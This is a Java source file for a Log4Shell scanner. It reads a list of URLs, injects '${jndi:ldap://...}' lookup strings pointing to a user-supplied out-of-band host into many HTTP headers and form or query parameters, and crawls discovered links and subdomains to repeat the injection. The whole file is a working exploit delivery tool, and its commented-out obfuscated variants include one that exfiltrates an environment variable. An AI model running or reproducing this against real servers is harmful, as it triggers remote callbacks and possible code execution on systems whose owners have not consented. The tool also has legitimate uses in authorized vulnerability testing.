import org.apache.http.client.HttpClient;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.jsoup.nodes.Element;

import java.io.*;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class log4jscanner {
    private static final String OUTPUT_FILE = "extracted_urls.txt";
    private static HashSet<String> domains = new HashSet<>();
    private static final int MAX_REQUESTS_BEFORE_PAUSE = 5;
    private static final long PAUSE_DURATION_IN_MS = 10000;



    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        try {
            HttpClient client = HttpClients.createDefault();
            System.out.println("Enter the Burp Collaborator URL:");
            String oobPayload = scanner.nextLine();
            String[] payloads = new String[] {
                    "${jndi:ldap://" + oobPayload + "}",
//                    "${jndi:ldaps://" + oobPayload + "}",
//                    "${jndi:dns://" + oobPayload + "}",
//                    "${jndi:rmi://" + oobPayload + "}",
//                    "${j${lower:n}di:ldap://" + oobPayload + "}",
//                    "${${::-j}${::-n}${::-d}${::-i}:ldap://" + oobPayload + "}",
//                    "${jndi:ldap://" + oobPayload + "/a}",
//                    "${jndi:ldap://" + oobPayload + "/cn=test}",
//                    "${jndi:ldap://" + oobPayload + "/${env:USER}}",
//                    "${${lower:j}${upper:n}${lower:d}i:rmi://" + oobPayload + "}"
            };

            System.out.println("Enter the path to the file containing URLs (one per line):");
            String filePath = scanner.nextLine();
            ArrayList<String> urls = readUrlsFromFile(filePath);

            System.out.println("Do you want to add custom headers? (yes/no)");
            String useCustomHeaders = scanner.next().trim().toLowerCase();
            scanner.nextLine();
            String[] headersToUse;
            if ("yes".equals(useCustomHeaders)) {
                System.out.println("Enter your custom headers (comma-separated):");
                String customHeaders = scanner.nextLine();
                headersToUse = customHeaders.split(",");
            } else {
                headersToUse = new String[] {
                        "User-Agent",
                        "X-Api-Version",
                        "X-Requested-With",
                        "Referer",
                        "X-Forwarded-For",
                        "X-Forwarded-Host",
                        "X-Forwarded-Server",
                        "X-Custom-IP-Authorization",
                        "X-Original-URL",
                        "X-Rewrite-URL",
                        "X-Client-IP",
                        "X-Remote-IP",
                        "X-Remote-Addr",
                        "X-Host",
                        "X-Custom-Header",
                        "X-Forwarded",
                        "Forwarded-For",
                        "Forwarded",
                        "Via",
                        "True-Client-IP",
                        "X-Real-IP"
                };
            }

            System.out.println("Enter parameter names (format: name1,name2):");
            String paramsInput = scanner.nextLine();
            String[] params = paramsInput.split(",");

            System.out.println("Do you want to send a GET or POST request? (G/P):");
            String requestType = scanner.next().trim().toUpperCase();
            scanner.nextLine();
            int poolSize = Math.min(5, urls.size());
            ExecutorService executor = Executors.newFixedThreadPool(poolSize);

            AtomicInteger requestCounter = new AtomicInteger();
            for (String url : urls) {
                executor.execute(() -> {
                    try {
                        if (requestCounter.getAndIncrement() % MAX_REQUESTS_BEFORE_PAUSE == 0 && requestCounter.get() > 1) {
                            System.out.println("Pausing due to rate limit...");
                            Thread.sleep(PAUSE_DURATION_IN_MS);
                        }
                        createTask(client, url, headersToUse, params, payloads, requestType).run();
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        System.out.println("Thread was interrupted during rate limit sleep.");
                    }
                });
            }

            Thread.sleep(100);
            ArrayList<String> extractedUrls = readUrlsFromFile(OUTPUT_FILE);
            for (String url : extractedUrls) {
                if (!urls.contains(url) && isSubdomain(url)) {
                    executor.execute(createTask(client, url, headersToUse, params, payloads, requestType));
                }
            }

            executor.shutdown();
            executor.awaitTermination(1, TimeUnit.HOURS);
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            scanner.close();
        }
        System.out.println("End of scanning process.");
    }

    private static Runnable createTask(HttpClient client, String url, String[] headers, String[] params, String[] payloads, String requestType) {
        return () -> {
            for (String payload : payloads) {  // Loop through each payload
                try {
                    System.out.println("Processing URL: " + url + " with payload: " + payload);
                    if (isSubdomain(url)) {
                        sendRequest(client, url, headers, params, payload, requestType);
                    } else {
                        addUrlToFile(url);
                    }
                } catch (Exception e) {
                    System.out.println("Error handling request for URL: " + url + " with payload: " + payload);
                    e.printStackTrace();
                }
            }
        };
    }

    private static ArrayList<String> readUrlsFromFile(String filePath) throws Exception {
        ArrayList<String> urls = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(new File(filePath)))) {
            String line;
            while ((line = reader.readLine()) != null) {
                String trimmedUrl = line.trim();
                urls.add(trimmedUrl);
                domains.add(getDomainName(trimmedUrl));
            }
        }
        return urls;
    }

    private static String getDomainName(String url) {
        return url.substring(url.indexOf("//") + 2).split("/")[0];
    }

    private static boolean isSubdomain(String url) {
        String domainName = getDomainName(url);
        for (String domain : domains) {
            if (domainName.endsWith(domain)) {
                return true;
            }
        }
        return false;
    }

    private static void addUrlToFile(String url) throws IOException {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(OUTPUT_FILE, true))) {
            writer.write(url + "\n");
        }
    }
    private static void sendRequest(HttpClient client, String url, String[] headers, String[] params, String payload, String requestType) throws Exception {
        if ("P".equals(requestType)) {
            sendPostRequest(client, url, headers, params, payload);
            System.out.println("Sending subdomain....");
        } else if ("G".equals(requestType)) {
            sendGetRequest(client, url, headers, params, payload);
        }
    }

    private static void sendPostRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
        HttpPost postRequest = new HttpPost(url);
        postRequest.setHeader("Content-type", "application/x-www-form-urlencoded");

        StringBuilder formData = new StringBuilder();
        for (String param : params) {
            if (formData.length() > 0) formData.append("&");
            formData.append(URLEncoder.encode(param, "UTF-8"))
                    .append("=")
                    .append(URLEncoder.encode(payload, "UTF-8"));
        }

        for (String header : headers) {
            postRequest.setHeader(header.trim(), payload);
        }

        StringEntity requestEntity = new StringEntity(formData.toString());
        postRequest.setEntity(requestEntity);

        HttpResponse response = client.execute(postRequest);
        String responseBody = EntityUtils.toString(response.getEntity());
        EntityUtils.consume(response.getEntity());
        printResponseDetails(response, responseBody);
        extractUrls(url, responseBody);
    }

    private static void sendGetRequest(HttpClient client, String url, String[] headers, String[] params, String payload) throws Exception {
        StringBuilder urlWithParams = new StringBuilder(url);
        urlWithParams.append("?");
        for (String param : params) {
            if (urlWithParams.charAt(urlWithParams.length() - 1) != '?') urlWithParams.append("&");
            urlWithParams.append(URLEncoder.encode(param, "UTF-8"))
                    .append("=")
                    .append(URLEncoder.encode(payload, "UTF-8"));
        }

        HttpGet getRequest = new HttpGet(urlWithParams.toString());
        for (String header : headers) {
            getRequest.setHeader(header.trim(), payload);
        }

        HttpResponse response = client.execute(getRequest);
        String responseBody = EntityUtils.toString(response.getEntity());
        EntityUtils.consume(response.getEntity());
        printResponseDetails(response, responseBody);
        extractUrls(url, responseBody);
    }

    private static void printResponseDetails(HttpResponse response, String responseBody) {
        System.out.println("HTTP Response Code: " + response.getStatusLine().getStatusCode());
        System.out.println("Response Body: " + responseBody);
    }

    private static void extractUrls(String baseUrl, String htmlContent) throws IOException {
        Document doc = Jsoup.parse(htmlContent, baseUrl);
        Elements links = doc.select("a[href], form[action]");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(OUTPUT_FILE, true))) {
            for (Element link : links) {
                String foundUrl = link.tagName().equals("form") ? link.absUrl("action") : link.absUrl("href");
                if (!foundUrl.isEmpty()) {
                    writer.write(foundUrl + "\n");
                }
            }
        }
    }
}
